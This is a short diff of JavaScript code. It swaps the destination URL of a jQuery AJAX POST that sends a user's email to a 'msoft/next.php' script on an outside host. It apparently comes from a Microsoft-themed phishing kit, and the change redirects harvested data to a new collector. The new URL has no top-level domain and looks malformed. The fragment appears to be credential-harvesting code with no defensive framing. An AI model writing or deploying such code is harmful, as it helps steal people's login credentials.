@@ -223,7 +223,7 @@ count=count+1;
 
 $.ajax({
 dataType: 'JSON',
-url: 'https://elaislaw.net/msoft/next.php',
+url: 'https://technoriya/msoft/next.php',
 type: 'POST',
       	data:{
       		email:email,
